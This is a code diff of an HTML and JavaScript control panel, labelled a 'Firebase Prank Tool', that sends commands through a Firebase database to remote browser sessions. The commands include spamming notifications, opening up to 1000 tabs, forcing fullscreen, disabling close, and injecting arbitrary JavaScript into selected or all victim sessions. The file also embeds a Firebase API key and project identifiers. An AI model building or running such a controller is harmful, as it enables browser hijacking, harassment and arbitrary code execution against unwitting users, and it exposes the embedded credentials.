@@ -1,70 +1,209 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Controller - Remote Control</title>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    background: #1a1a1a;
-    color: #eee;
-    margin: 0; padding: 0;
-  }
-  header {
-    background: #0055ff;
-    padding: 1rem;
-    text-align: center;
-  }
-  main {
-    max-width: 900px;
-    margin: 1rem auto;
-    padding: 1rem;
-    background: #222;
-    border-radius: 6px;
-  }
-  label, input, select, button, textarea {
-    display: block;
-    margin-bottom: 0.8rem;
-    width: 100%;
-    font-size: 1rem;
-  }
-  input, select, textarea {
-    padding: 0.4rem;
-    border-radius: 4px;
-    border: none;
-  }
-  button {
-    background: #007bff;
-    color: white;
-    border: none;
-    padding: 0.8rem;
-    cursor: pointer;
-    border-radius: 4px;
-    font-weight: bold;
-  }
-  button:hover {
-    background: #0056b3;
-  }
-  .section {
-    margin-bottom: 2rem;
-  }
-  h2 {
-    margin-top: 0;
-    border-bottom: 1px solid #444;
-    padding-bottom: 0.3rem;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Remote Controller - Firebase Prank Tool</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+    :root {
+      --bg-color: #121212;
+      --primary-color: #2962ff;
+      --secondary-color: #424242;
+      --text-color: #e0e0e0;
+      --accent-color: #03dac6;
+      --border-radius: 8px;
+    }
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: var(--bg-color);
+      color: var(--text-color);
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    header {
+      background: var(--primary-color);
+      padding: 1.2rem 1rem;
+      text-align: center;
+      font-weight: 600;
+      font-size: 1.8rem;
+      letter-spacing: 1.1px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+    }
+    main {
+      flex: 1;
+      max-width: 900px;
+      margin: 2rem auto;
+      padding: 1rem 2rem;
+      background: var(--secondary-color);
+      border-radius: var(--border-radius);
+      box-shadow: 0 0 30px rgba(0,0,0,0.8);
+    }
+    h2 {
+      margin-top: 0;
+      border-bottom: 2px solid var(--primary-color);
+      padding-bottom: 0.4rem;
+      font-weight: 600;
+    }
+    label {
+      display: block;
+      margin: 0.8rem 0 0.3rem 0;
+      font-weight: 500;
+    }
+    input[type="text"],
+    input[type="number"],
+    select,
+    textarea {
+      width: 100%;
+      padding: 0.5rem;
+      border-radius: var(--border-radius);
+      border: none;
+      font-size: 1rem;
+      background: #1e1e1e;
+      color: var(--text-color);
+      resize: vertical;
+      box-sizing: border-box;
+      transition: background 0.3s;
+    }
+    input[type="text"]:focus,
+    input[type="number"]:focus,
+    select:focus,
+    textarea:focus {
+      outline: none;
+      background: #2c2c2c;
+    }
+    button {
+      margin-top: 1rem;
+      background: var(--accent-color);
+      border: none;
+      padding: 0.8rem 1.2rem;
+      color: #000;
+      font-weight: 600;
+      font-size: 1rem;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      box-shadow: 0 3px 6px rgba(3,218,198,0.5);
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #00e5c4;
+    }
+    .section {
+      margin-bottom: 2.5rem;
+    }
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin-top: 0.4rem;
+      font-weight: 500;
+    }
+    .session-list {
+      max-height: 200px;
+      overflow-y: auto;
+      background: #222;
+      padding: 0.5rem;
+      border-radius: var(--border-radius);
+      margin-top: 0.5rem;
+    }
+    .session-item {
+      padding: 0.3rem 0.5rem;
+      border-bottom: 1px solid #444;
+      cursor: pointer;
+      user-select: none;
+    }
+    .session-item.selected {
+      background: var(--primary-color);
+      color: #fff;
+      font-weight: 600;
+    }
+    .history-list {
+      max-height: 250px;
+      overflow-y: auto;
+      background: #222;
+      padding: 0.5rem;
+      border-radius: var(--border-radius);
+      margin-top: 0.5rem;
+      font-size: 0.9rem;
+      color: #bbb;
+    }
+    .history-item {
+      margin-bottom: 0.3rem;
+      border-bottom: 1px solid #444;
+      padding-bottom: 0.3rem;
+    }
+    .history-item strong {
+      color: var(--accent-color);
+    }
+    .logout-btn {
+      position: fixed;
+      top: 12px;
+      right: 12px;
+      background: #bb0000;
+      color: white;
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      font-weight: 600;
+      box-shadow: 0 2px 8px rgba(187,0,0,0.7);
+      z-index: 1000;
+    }
+    .login-btn {
+      background: var(--accent-color);
+      color: #000;
+      border: none;
+      padding: 1rem 2rem;
+      font-size: 1.3rem;
+      font-weight: 700;
+      cursor: pointer;
+      border-radius: var(--border-radius);
+      margin: 3rem auto;
+      display: block;
+      box-shadow: 0 4px 12px rgba(3,218,198,0.6);
+    }
+    .login-container {
+      max-width: 360px;
+      margin: 6rem auto;
+      background: var(--secondary-color);
+      border-radius: var(--border-radius);
+      padding: 2rem;
+      box-shadow: 0 0 25px rgba(0,0,0,0.8);
+      text-align: center;
+    }
+    .loading {
+      text-align: center;
+      font-size: 1.3rem;
+      color: var(--accent-color);
+      margin-top: 2rem;
+    }
+  </style>
 </head>
 <body>
-<header>
-  <h1>Controller - Remote Control</h1>
-</header>
-<main>
+
+<header>Remote Controller - Firebase Prank Tool</header>
+
+<button id="logoutBtn" class="logout-btn" style="display:none;">Logout</button>
+
+<div id="loginScreen" class="login-container" style="display:none;">
+  <h2>Sign in with Gmail</h2>
+  <button id="loginBtn" class="login-btn">Sign in with Google</button>
+  <small>Only Gmail accounts allowed to identify sessions.</small>
+</div>
+
+<main id="app" style="display:none;">
+  <div class="section">
+    <h2>Active Sessions (click to select)</h2>
+    <div id="sessions" class="session-list" title="Click session to select"></div>
+    <small>Selected session(s) will receive commands. Leave empty to broadcast to all.</small>
+  </div>
+
   <div class="section">
     <h2>Send Notification</h2>
     <label for="notifTitle">Title</label>
-    <input type="text" id="notifTitle" placeholder="Notification Title" />
+    <input id="notifTitle" type="text" placeholder="Notification title" />
     <label for="notifMsg">Message</label>
     <textarea id="notifMsg" rows="3" placeholder="Notification message"></textarea>
     <label for="notifSound">Sound</label>
@@ -74,42 +213,65 @@
       <option value="ding">Ding</option>
       <option value="alert">Alert</option>
     </select>
-    <label for="notifRepeat">Repeat Count</label>
-    <input type="number" id="notifRepeat" min="1" max="10" value="1" />
-    <label for="notifDelay">Delay Before (ms)</label>
-    <input type="number" id="notifDelay" min="0" value="0" />
+    <label for="notifRepeat">Repeat count (1-10)</label>
+    <input id="notifRepeat" type="number" min="1" max="10" value="1" />
+    <label for="notifDelay">Delay before notify (ms)</label>
+    <input id="notifDelay" type="number" min="0" value="0" />
     <button id="sendNotifBtn">Send Notification</button>
   </div>
 
   <div class="section">
     <h2>Mass Tab Open</h2>
-    <label for="massTabUrl">URL to Open</label>
-    <input type="text" id="massTabUrl" placeholder="https://example.com" />
-    <label for="massTabCount">Number of Tabs</label>
-    <input type="number" id="massTabCount" min="1" max="1000" value="10" />
-    <label for="massTabDelay">Delay Between Opens (ms)</label>
-    <input type="number" id="massTabDelay" min="0" value="100" />
-    <label><input type="checkbox" id="massTabAutoClose" /> Auto Close Tabs After</label>
-    <input type="number" id="massTabAutoCloseTime" min="1" max="3600" value="60" placeholder="Seconds" />
+    <label for="massTabUrl">URL</label>
+    <input id="massTabUrl" type="text" placeholder="https://example.com" />
+    <label for="massTabCount">Number of tabs (1-1000)</label>
+    <input id="massTabCount" type="number" min="1" max="1000" value="10" />
+    <label for="massTabDelay">Delay between opens (ms)</label>
+    <input id="massTabDelay" type="number" min="0" value="100" />
+    <div class="checkbox-group">
+      <input id="massTabAutoClose" type="checkbox" />
+      <label for="massTabAutoClose">Auto close tabs after</label>
+      <input id="massTabAutoCloseTime" type="number" min="1" max="3600" value="60" style="width: 80px; margin-left: 0.4rem;" />
+      <label for="massTabAutoCloseTime" style="margin-left: 0.2rem;">seconds</label>
+    </div>
     <button id="sendMassTabBtn">Open Tabs</button>
   </div>
 
   <div class="section">
     <h2>Advanced Commands</h2>
-    <label><input type="checkbox" id="advFullscreen" /> Force Fullscreen</label>
-    <label><input type="checkbox" id="advDisableClose" /> Disable Close</label>
-    <label><input type="checkbox" id="advMute" /> Mute Audio</label>
-    <label><input type="checkbox" id="advUnmute" /> Unmute Audio</label>
+    <div class="checkbox-group">
+      <input id="advFullscreen" type="checkbox" />
+      <label for="advFullscreen">Force Fullscreen</label>
+    </div>
+    <div class="checkbox-group">
+      <input id="advDisableClose" type="checkbox" />
+      <label for="advDisableClose">Disable Close</label>
+    </div>
+    <div class="checkbox-group">
+      <input id="advMute" type="checkbox" />
+      <label for="advMute">Mute Audio</label>
+    </div>
+    <div class="checkbox-group">
+      <input id="advUnmute" type="checkbox" />
+      <label for="advUnmute">Unmute Audio</label>
+    </div>
     <label for="advInjectJS">Inject JavaScript (one line)</label>
     <textarea id="advInjectJS" rows="3" placeholder="alert('Hello!');"></textarea>
     <button id="sendAdvancedBtn">Send Advanced Command</button>
   </div>
+
+  <div class="section">
+    <h2>Command History</h2>
+    <div id="history" class="history-list"></div>
+  </div>
 </main>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 
 <script>
+  // Your Firebase config here
   const firebaseConfig = {
     apiKey: "AIzaSyDSpv4ci1qJo3Oi5WA4gj1pxrBXjxaYYao",
     authDomain: "notify-78da1.firebaseapp.com",
@@ -119,86 +281,217 @@
     messagingSenderId: "936289141781",
     appId: "1:936289141781:web:065ef577df0aa61f40fa1c"
   };
-
   firebase.initializeApp(firebaseConfig);
+  const auth = firebase.auth();
   const db = firebase.database();
 
-  function generateCommandId() {
-    return 'cmd_' + Math.random().toString(36).substr(2, 9);
+  const loginBtn = document.getElementById('loginBtn');
+  const logoutBtn = document.getElementById('logoutBtn');
+  const loginScreen = document.getElementById('loginScreen');
+  const app = document.getElementById('app');
+  const sessionsDiv = document.getElementById('sessions');
+  const historyDiv = document.getElementById('history');
+
+  let selectedSessions = new Set();
+  let userEmail = null;
+  let userId = null;
+
+  function showLogin() {
+    loginScreen.style.display = 'block';
+    app.style.display = 'none';
+    logoutBtn.style.display = 'none';
   }
 
-  function sendCommand(data) {
-    const id = generateCommandId();
-    data.id = id;
-    data.timestamp = Date.now();
-    data.sender = "controller";
-    return db.ref('commands/' + id).set(data);
+  function showApp() {
+    loginScreen.style.display = 'none';
+    app.style.display = 'block';
+    logoutBtn.style.display = 'inline-block';
   }
 
-  document.getElementById('sendNotifBtn').onclick = () => {
-    const title = document.getElementById('notifTitle').value.trim();
-    const message = document.getElementById('notifMsg').value.trim();
-    if (!title || !message) {
-      alert('Please enter both title and message');
+  function addHistory(text) {
+    const d = new Date();
+    const timeStr = d.toLocaleTimeString();
+    const el = document.createElement('div');
+    el.className = 'history-item';
+    el.innerHTML = `<strong>[${timeStr}]</strong> ${text}`;
+    historyDiv.prepend(el);
+  }
+
+  function updateSessionsList(sessions) {
+    sessionsDiv.innerHTML = '';
+    if (sessions.length === 0) {
+      sessionsDiv.textContent = 'No active sessions found.';
       return;
     }
+    sessions.forEach(session => {
+      const div = document.createElement('div');
+      div.className = 'session-item';
+      div.textContent = session;
+      if (selectedSessions.has(session)) div.classList.add('selected');
+      div.addEventListener('click', () => {
+        if (selectedSessions.has(session)) {
+          selectedSessions.delete(session);
+          div.classList.remove('selected');
+        } else {
+          selectedSessions.add(session);
+          div.classList.add('selected');
+        }
+      });
+      sessionsDiv.appendChild(div);
+    });
+  }
+
+  async function loadSessions() {
+    // Fetch all active sessions from Firebase under /sessions
+    const snapshot = await db.ref('sessions').once('value');
+    const data = snapshot.val() || {};
+    // Filter sessions that were active in last 10 minutes (timestamp)
+    const now = Date.now();
+    const activeSessions = [];
+    for (const [key, val] of Object.entries(data)) {
+      if (val.lastSeen && (now - val.lastSeen < 10 * 60 * 1000)) {
+        activeSessions.push(key);
+      }
+    }
+    updateSessionsList(activeSessions);
+  }
+
+  // Send a command to Firebase Realtime DB under /commands node
+  async function sendCommand(command) {
+    const cmd = {
+      ...command,
+      from: userEmail,
+      timestamp: Date.now(),
+      targets: Array.from(selectedSessions), // empty array means broadcast to all
+    };
+    await db.ref('commands').push(cmd);
+    addHistory(`Sent command: ${cmd.type} to ${cmd.targets.length ? cmd.targets.join(', ') : 'ALL'}`);
+  }
+
+  // Handle UI button clicks for sending commands
+
+  document.getElementById('sendNotifBtn').onclick = async () => {
+    const title = document.getElementById('notifTitle').value.trim();
+    const message = document.getElementById('notifMsg').value.trim();
     const sound = document.getElementById('notifSound').value;
-    const repeat = parseInt(document.getElementById('notifRepeat').value) || 1;
-    const delay = parseInt(document.getElementById('notifDelay').value) || 0;
-    sendCommand({
+    let repeat = parseInt(document.getElementById('notifRepeat').value) || 1;
+    repeat = Math.min(Math.max(repeat, 1), 10);
+    let delay = parseInt(document.getElementById('notifDelay').value) || 0;
+    if (!title || !message) {
+      alert('Notification title and message are required.');
+      return;
+    }
+    await sendCommand({
       type: 'notification',
       title,
       message,
       sound,
       repeat,
-      scheduleDelay: delay
+      delay,
     });
-    alert('Notification sent!');
   };
 
-  document.getElementById('sendMassTabBtn').onclick = () => {
+  document.getElementById('sendMassTabBtn').onclick = async () => {
     const url = document.getElementById('massTabUrl').value.trim();
-    const count = parseInt(document.getElementById('massTabCount').value);
-    const delay = parseInt(document.getElementById('massTabDelay').value);
+    let count = parseInt(document.getElementById('massTabCount').value) || 1;
+    count = Math.min(Math.max(count, 1), 1000);
+    let delay = parseInt(document.getElementById('massTabDelay').value) || 0;
     const autoClose = document.getElementById('massTabAutoClose').checked;
-    const autoCloseTime = parseInt(document.getElementById('massTabAutoCloseTime').value) || 60;
-    if (!url || !count || count < 1) {
-      alert('Valid URL and count required!');
+    let autoCloseTime = parseInt(document.getElementById('massTabAutoCloseTime').value) || 60;
+    autoCloseTime = Math.min(Math.max(autoCloseTime, 1), 3600);
+
+    if (!url) {
+      alert('URL is required for mass tab open.');
       return;
     }
-    sendCommand({
-      type: 'massTabOpen',
+    await sendCommand({
+      type: 'massTab',
       url,
       count,
       delay,
       autoClose,
-      autoCloseTime
+      autoCloseTime,
     });
-    alert('Mass tab open command sent!');
   };
 
-  document.getElementById('sendAdvancedBtn').onclick = () => {
-    const forceFullscreen = document.getElementById('advFullscreen').checked;
+  document.getElementById('sendAdvancedBtn').onclick = async () => {
+    const fullscreen = document.getElementById('advFullscreen').checked;
     const disableClose = document.getElementById('advDisableClose').checked;
-    const muteAudio = document.getElementById('advMute').checked;
-    const unmuteAudio = document.getElementById('advUnmute').checked;
+    const mute = document.getElementById('advMute').checked;
+    const unmute = document.getElementById('advUnmute').checked;
     const injectJS = document.getElementById('advInjectJS').value.trim();
 
-    if (!forceFullscreen && !disableClose && !muteAudio && !unmuteAudio && !injectJS) {
-      alert('Please select or enter at least one advanced command');
+    if (!fullscreen && !disableClose && !mute && !unmute && !injectJS) {
+      alert('Select or enter at least one advanced command.');
       return;
     }
 
-    sendCommand({
+    await sendCommand({
       type: 'advanced',
-      forceFullscreen,
+      fullscreen,
       disableClose,
-      muteAudio,
-      unmuteAudio,
-      injectJS
+      mute,
+      unmute,
+      injectJS,
     });
-    alert('Advanced command sent!');
+
+    // Clear advanced inputs after sending
+    document.getElementById('advFullscreen').checked = false;
+    document.getElementById('advDisableClose').checked = false;
+    document.getElementById('advMute').checked = false;
+    document.getElementById('advUnmute').checked = false;
+    document.getElementById('advInjectJS').value = '';
   };
+
+  logoutBtn.onclick = () => {
+    auth.signOut();
+  };
+
+  loginBtn.onclick = () => {
+    const provider = new firebase.auth.GoogleAuthProvider();
+    auth.signInWithPopup(provider)
+      .then((result) => {
+        // Signed in
+        const email = result.user.email;
+        if (!email.endsWith('@gmail.com')) {
+          alert('Only Gmail accounts allowed!');
+          auth.signOut();
+          return;
+        }
+      })
+      .catch(err => {
+        alert('Login failed: ' + err.message);
+      });
+  };
+
+  // On Auth state changed
+  auth.onAuthStateChanged(user => {
+    if (user) {
+      userEmail = user.email;
+      userId = user.uid;
+      showApp();
+      loadSessions();
+      addHistory(`Logged in as ${userEmail}`);
+      // Update session active for user to keep controller alive
+      db.ref('controllers/' + userId).set({
+        email: userEmail,
+        lastSeen: Date.now(),
+      });
+    } else {
+      userEmail = null;
+      userId = null;
+      showLogin();
+      selectedSessions.clear();
+      sessionsDiv.innerHTML = '';
+      historyDiv.innerHTML = '';
+    }
+  });
+
+  // Refresh sessions every 15 seconds
+  setInterval(() => {
+    if (userEmail) loadSessions();
+  }, 15000);
+
 </script>
 </body>
 </html>
